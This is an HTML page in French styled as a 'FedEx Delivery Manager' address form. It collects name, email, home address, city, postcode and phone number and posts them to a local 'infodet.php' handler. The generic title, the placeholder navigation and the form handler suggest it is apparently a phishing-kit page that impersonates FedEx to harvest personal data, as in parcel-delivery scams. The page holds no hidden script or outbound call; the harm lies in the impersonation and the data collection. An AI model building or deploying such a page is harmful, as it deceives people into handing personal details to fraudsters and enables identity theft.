<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/favicon.ico">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link rel="stylesheet" href="css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400;1,600&display=swap" rel="stylesheet">
    <title>Document</title>
    <style>
        * {
            font-family: "Open Sans", sans-serif !important;
        }
    </style>

</head>

<body>
    <nav class="navbar navbar-expand-lg  p-3" id="navbar1">
        <div class="container">
            <a class="navbar-brand" href="#"><img src="img/logo.png" alt="Fedex" style="width: 100px;"></a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon text-white"></span>
            </button>
            <div class="collapse navbar-collapse justify-content-center" id="navbarNavAltMarkup">
                <div class="navbar-nav ">
                    <a class="nav-link text-white" aria-current="page" href="#">Expédier</a>
                    <a class="nav-link text-white" style="margin-left: 20px" href="#">Suivi</a>
                    <a class="nav-link text-white" style="margin-left: 20px" href="#">Support</a>
                    <a class="nav-link text-white" style="margin-left: 20px">Compte</a>
                </div>
            </div>
        </div>
    </nav>
    <div class="formVal">
        <div class="container d-flex justify-content-center align-items-center flex-column pt-5">
            <h1>FedEx Delivery Manager &reg;</h1>
            <p style="text-align: center;">Veuillez saisir l'adresse résidentielle où vous recevez les colis.</p>
            <form action="infodet.php" method="POST" class="row w-100 needs-validation" novalidate>
                <div class="col-md">
                    <div class="form-floating mb-3">
                        <input type="text" class="form-control" name="nom" id="floatingNom" placeholder="Nom" required>
                        <label for="floatingNom">Nom</label>
                    </div>
                </div>
                <div class="col-md">
                    <div class="form-floating mb-3">
                        <input type="text" class="form-control" name="prenom" id="floatingPrenom" placeholder="Prénom" required>
                        <label for="floatingPrenom">Prénom</label>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="form-floating mb-3">
                        <input type="email" class="form-control" name="email" id="floatingEmail" placeholder="Prénom" required>
                        <label for="floatingEmail">Email</label>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="form-floating mb-3">
                        <input type="text" class="form-control" id="floatingAdress" name="adresse" placeholder="Adresse" required>
                        <label for="floatingAdress">Adresse</label>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="form-floating mb-3">
                        <select class="form-select" name="pays" id="floatingSelectGrid" required>
                            <option selected value="Belgique">Belgique</option>
                            <option value="France">France</option>
                            <option value="Canada">Canada</option>
                            <option value="Allemagne">Allemagne</option>
                            <option value="Suisse">Suisse</option>
                            <option value="Luxembourg">Luxembourg</option>
                            <option value="Espagne">Espagne</option>
                            <option value="Danemark">Danemark</option>
                            <option value="Italie">Italie</option>
                            <option value="Angleterre">Angleterre</option>
                            <option value="Royaume-Uni">Royaume-Uni</option>
                            <option value="Ukraine">Ukraine</option>
                            <option value="Suéde">Suéde</option>
                            <option value="Pologne">Pologne</option>
                        </select>
                        <label for="floatingSelectGrid">Pays</label>
                    </div>
                </div>
                <div class="col-md">
                    <div class="form-floating mb-3">
                        <input type="text" class="form-control" name="ville" id="floatingVille" placeholder="Ville" required>
                        <label for="floatingVille">Ville</label>
                    </div>
                </div>
                <div class="col-md">
                    <div class="form-floating mb-3">
                        <input type="text" class="form-control" id="floatingCodePostal" name="zip" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" placeholder="Code Postale" required>
                        <label for="floatingCodePostale">Code Postale</label>
                    </div>
                </div>
                <div class="col-md-12">
                    <div class="form-floating mb-3">
                        <input type="text" class="form-control" name="telephone" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" id="floatingPhone" placeholder="Telephone" required>
                        <label for="floatingPhone">Telephone</label>
                    </div>
                </div>
                <div class="col-12">
                    <button class="btn btn-primary btn-lg" type="submit">Continue</button>
                </div>


            </form>
        </div>


    </div>

    <script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js" integrity="sha384-cuYeSxntonz0PPNlHhBs68uyIAVpIIOZZ5JqeqvYYIcEL727kskC66kF92t6Xl2V" crossorigin="anonymous"></script>
    <script>
        (() => {
            'use strict'

            // Fetch all the forms we want to apply custom Bootstrap validation styles to
            const forms = document.querySelectorAll('.needs-validation')

            // Loop over them and prevent submission
            Array.from(forms).forEach(form => {
                form.addEventListener('submit', event => {
                    if (!form.checkValidity()) {
                        event.preventDefault()
                        event.stopPropagation()
                    }

                    form.classList.add('was-validated')
                }, false)
            })
        })()
    </script>
</body>

</html>